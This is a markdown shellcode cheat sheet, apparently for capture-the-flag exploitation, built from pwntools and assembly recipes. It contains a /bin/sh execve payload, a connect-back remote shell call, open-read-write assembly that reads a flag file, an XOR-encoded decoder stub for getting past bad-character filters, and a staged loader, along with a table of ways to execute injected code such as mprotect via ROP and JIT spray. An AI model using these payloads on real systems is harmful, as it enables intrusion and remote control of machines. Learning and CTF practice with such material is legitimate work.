# Shellcode

## pwntools (fastest path)
```python
# IN: context.arch  OUT: shellcode bytes
from pwn import *
context.arch = 'amd64'
sc = asm(shellcraft.sh())           # execve("/bin/sh")
assert b'\x00' not in sc or True    # check for nulls if needed
```
```python
# Other recipes
shellcraft.cat('flag.txt')           # open + read + write
shellcraft.connect('host', 4444)     # connect-back shell
shellcraft.dupsh(4)                  # dup fd + shell
```

## ORW (Open-Read-Write)
**When**: `execve` blocked by seccomp but `open`/`read`/`write` allowed.
```python
# IN: flag path  OUT: shellcode that prints flag to stdout
from pwn import *
context.arch = 'amd64'
sc = asm(shellcraft.cat('flag.txt'))
# Manual equivalent:
sc_manual = asm('''
    /* open("flag.txt", 0) */
    push 0; mov rax, 0x7478742e67616c66; push rax; mov rdi, rsp; xor esi, esi; mov al, 2; syscall
    /* read(fd, rsp, 0x100) */
    mov rdi, rax; mov rsi, rsp; mov dl, 0xff; xor eax, eax; syscall
    /* write(1, rsp, rax) */
    mov rdx, rax; mov rdi, 1; mov rsi, rsp; mov al, 1; syscall
''')
```

## Null-Free
**Trap**: many I/O functions stop at `\x00`. | Replace `mov rax, 0` → `xor eax, eax`; `mov al, 59` → `push 59; pop rax`.
```python
sc = asm(shellcraft.sh())
if b'\x00' in sc:
    sc = asm(shellcraft.sh())  # pwntools usually generates null-free by default
assert b'\x00' not in sc
```

## XOR-Encoded (Bad Char Bypass)
```python
# IN: shellcode, forbidden_bytes  OUT: encoded shellcode with decoder stub
from pwn import *
context.arch = 'amd64'
key = 0x41
encoded = bytes(b ^ key for b in shellcode)
assert not any(b in encoded for b in forbidden_bytes)

decoder = asm(f'''
    jmp get_sc
decode:
    pop rsi
    mov rcx, {len(shellcode)}
loop:
    xor byte ptr [rsi], {key}
    inc rsi
    loop loop
    jmp rsi
get_sc:
    call decode
''') + encoded  # decoder stub + encoded payload
```

## Staged (Small Buffer)
**When**: only a few bytes fit. Stage 1 reads Stage 2 from stdin.
```python
from pwn import *
context.arch = 'amd64'
stage1 = asm('''
    xor eax, eax; xor edi, edi; lea rsi, [rip]; mov dl, 0xff; syscall; jmp rsi
''')
assert len(stage1) < 20
# Send stage1, then send real shellcode via stdin
```

## Architectures
| Arch | Syscall | NR (execve) | Args | pwntools |
|---|---|---|---|---|
| x86-64 | `syscall` | 59 | rdi, rsi, rdx | `context.arch='amd64'` |
| x86-32 | `int 0x80` | 11 | ebx, ecx, edx | `context.arch='i386'` |
| ARM | `svc 0` | 11 | r0, r1, r2 | `context.arch='arm'` |
| ARM64 | `svc 0` | 221 | x0, x1, x2 | `context.arch='aarch64'` |

## Execution Methods
| Method | Requirement |
|---|---|
| Stack buffer (NX off) | `checksec` shows NX disabled |
| `mprotect` via ROP → jump | ROP + known buffer address |
| mmap RWX region | Can call `mmap` |
| JIT spray | JIT compiler present |
